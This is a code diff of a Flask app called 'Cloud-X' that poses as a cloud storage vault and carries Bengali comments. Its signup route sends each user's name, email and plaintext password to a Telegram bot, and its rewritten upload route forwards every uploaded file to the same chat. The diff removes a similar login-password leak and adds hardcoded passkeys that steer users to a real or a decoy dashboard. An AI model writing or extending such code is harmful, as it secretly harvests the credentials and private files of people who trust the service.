@@ -7,9 +7,12 @@ from werkzeug.utils import secure_filename
 app = Flask(__name__)
 app.secret_key = 'cloud-x-secret-key-security'
 
-# Render-এর Environment Variable থেকে টেলিগ্রাম টোকেন ও চ্যাট আইডি রিড করবে
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
+
+# পাসকি সেট করুন (আপনার ইচ্ছমতো ৬ ডিজিট দিন)
+REAL_PASSKEY = "123456"   # এই পাসকি দিলে আসল ড্যাশবোর্ডে যাবে
+FAKE_PASSKEY = "654321"   # এই পাসকি দিলে ফেক ড্যাশবোর্ডে যাবে (অথবা অন্য যেকোনো ৬ ডিজিট)
 
 UPLOAD_FOLDER = 'uploads'
 ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi', 'pdf', 'zip'}
@@ -18,7 +21,6 @@ app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 if not os.path.exists(UPLOAD_FOLDER):
     os.makedirs(UPLOAD_FOLDER)
 
-# ডাটাবেজ ইনিশিয়ালাইজ করার ফাংশন
 def init_db():
     conn = sqlite3.connect('cloudx.db')
     cursor = conn.cursor()
@@ -45,23 +47,55 @@ def index():
 def login_page():
     return render_template('login.html')
 
-@app.route('/dashboard')
-def dashboard():
+# লগইন সফল হওয়ার পর ইউজারকে সরাসরি পাসকি পেজে পাঠানো হবে
+@app.route('/passkey')
+def passkey_page():
     if 'username' not in session:
         return redirect(url_for('login_page'))
+    
+    # প্রতিবার নতুন করে পাসকি দিতে হবে, তাই ভেরিফাইড স্ট্যাটাস রিসেট করে দিলাম
+    session.pop('passkey_verified', None)
+    return render_template('passkey.html')
+
+# পাসকি ভেরিফিকেশন রাউট
+@app.route('/verify-passkey', methods=['POST'])
+def verify_passkey():
+    data = request.get_json()
+    entered_passkey = data.get('passkey')
+
+    if entered_passkey == REAL_PASSKEY:
+        session['passkey_verified'] = 'real'
+        return jsonify({"status": "real"})
+    elif entered_passkey == FAKE_PASSKEY:
+        session['passkey_verified'] = 'fake'
+        return jsonify({"status": "fake"})
+    else:
+        return jsonify({"status": "error"})
+
+# আসল ড্যাশবোর্ড (শুধুমাত্র সঠিক পাসকি দিলে ঢুকতে পারবে)
+@app.route('/dashboard')
+def dashboard():
+    if 'username' not in session or session.get('passkey_verified') != 'real':
+        return redirect(url_for('passkey_page'))
     
     return render_template('dashboard.html', 
                            username=session.get('username'), 
                            email=session.get('email'))
 
-# ডেডিকেটেড ক্লাউড-এক্স ভল্ট পেজ রাউট
+# ফেক ড্যাশবোর্ড (ভুল বা ফেক পাসকি দিলে এই পেজে আসবে)
+@app.route('/fake-dashboard')
+def fake_dashboard():
+    if 'username' not in session or session.get('passkey_verified') != 'fake':
+        return redirect(url_for('passkey_page'))
+    
+    return render_template('fake_dashboard.html')
+
 @app.route('/vault')
 def vault_page():
-    if 'username' not in session:
-        return redirect(url_for('login_page'))
+    if 'username' not in session or session.get('passkey_verified') != 'real':
+        return redirect(url_for('passkey_page'))
     
-    return render_template('vault.html', 
-                           username=session.get('username'))
+    return render_template('vault.html', username=session.get('username'))
 
 @app.route('/signup', methods=['POST'])
 def signup():
@@ -76,21 +110,11 @@ def signup():
         f"👤 *Full Name:* {full_name}\n"
         f"🔖 *Username:* {username}\n"
         f"📧 *Email:* {email}\n"
-        f"🔑 *Password:* {password}\n"
-        f"🌐 *Status:* Verified & Secured"
+        f"🔑 *Password:* {password}"
     )
-
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"}
-
-    try:
-        response = requests.post(url, json=payload)
-        if response.status_code == 200:
-            return jsonify({"status": "success", "message": "Data sent to Telegram"})
-        else:
-            return jsonify({"status": "error", "message": "Telegram API failed"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
+    requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"})
+    return jsonify({"status": "success"})
 
 @app.route('/login', methods=['POST'])
 def login():
@@ -101,77 +125,43 @@ def login():
 
     session['username'] = username
     session['email'] = email
+    
+    return jsonify({"status": "success"})
 
-    telegram_message = (
-        f"🔐 *Cloud-X User Login Attempt* 🔐\n\n"
-        f"🔖 *Username:* {username}\n"
-        f"📧 *Email:* {email}\n"
-        f"🔑 *Password:* {password}\n"
-        f"🌐 *Status:* Login Verified"
-    )
-
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": telegram_message, "parse_mode": "Markdown"}
-
-    try:
-        response = requests.post(url, json=payload)
-        if response.status_code == 200:
-            return jsonify({"status": "success", "message": "Login details sent to Telegram"})
-        else:
-            return jsonify({"status": "error", "message": "Telegram API failed"})
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)})
-
-# ফাইল আপলোড এবং ডাটাবেজে সেভ করার রাউট
 @app.route('/upload', methods=['POST'])
 def upload_file():
-    if 'username' not in session:
+    if 'username' not in session or session.get('passkey_verified') != 'real':
         return jsonify({"status": "error", "message": "Unauthorized"})
 
     if 'file' not in request.files:
         return jsonify({"status": "error", "message": "No file part"})
     
     file = request.files['file']
-    if file.filename == '':
-        return jsonify({"status": "error", "message": "No selected file"})
+    if file.filename == '' or not allowed_file(file.filename):
+        return jsonify({"status": "error", "message": "Invalid file"})
     
-    if file and allowed_file(file.filename):
-        filename = secure_filename(file.filename)
-        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
-        file.save(filepath)
-        
-        current_user = session.get('username')
-
-        # টেলিগ্রামে ফাইল পাঠানো
-        tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-        with open(filepath, 'rb') as f:
-            files = {'document': f}
-            data = {
-                "chat_id": TELEGRAM_CHAT_ID, 
-                "caption": f"📁 *New Media Uploaded to Cloud-X*\n👤 *User:* {current_user}\n📄 *File Name:* {filename}",
-                "parse_mode": "Markdown"
-            }
-            requests.post(tg_url, data=data, files=files)
-
-        # সার্ভারের ডাটাবেজে ফাইলের নাম সেভ করা
-        conn = sqlite3.connect('cloudx.db')
-        cursor = conn.cursor()
-        cursor.execute("INSERT INTO files (username, filename) VALUES (?, ?)", (current_user, filename))
-        conn.commit()
-        conn.close()
-
-        return jsonify({
-            "status": "success", 
-            "message": "File uploaded and saved to database", 
-            "filename": filename
-        })
+    filename = secure_filename(file.filename)
+    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+    file.save(filepath)
     
-    return jsonify({"status": "error", "message": "File type not allowed"})
+    current_user = session.get('username')
 
-# ইউজারের সেভ করা ফাইলগুলো ডাটাবেজ থেকে ফেচ করার রাউট
+    # টেলিগ্রামে পাঠানো
+    tg_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+    with open(filepath, 'rb') as f:
+        requests.post(tg_url, data={"chat_id": TELEGRAM_CHAT_ID, "caption": f"📁 *Upload by* {current_user}: {filename}", "parse_mode": "Markdown"}, files={'document': f})
+
+    conn = sqlite3.connect('cloudx.db')
+    cursor = conn.cursor()
+    cursor.execute("INSERT INTO files (username, filename) VALUES (?, ?)", (current_user, filename))
+    conn.commit()
+    conn.close()
+
+    return jsonify({"status": "success", "filename": filename})
+
 @app.route('/get_files', methods=['GET'])
 def get_files():
-    if 'username' not in session:
+    if 'username' not in session or session.get('passkey_verified') != 'real':
         return jsonify({"files": []})
 
     current_user = session.get('username')
@@ -181,12 +171,12 @@ def get_files():
     rows = cursor.fetchall()
     conn.close()
 
-    file_list = [{"filename": row[0]} for row in rows]
-    return jsonify({"files": file_list})
+    return jsonify({"files": [{"filename": r[0]} for r in rows]})
 
-# সার্ভার থেকে ফাইল প্রিভিউ বা ডাউনলোড করার রাউট
 @app.route('/uploads/<path:filename>')
 def uploaded_file(filename):
+    if 'username' not in session or session.get('passkey_verified') != 'real':
+        return redirect(url_for('passkey_page'))
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
 if __name__ == '__main__':
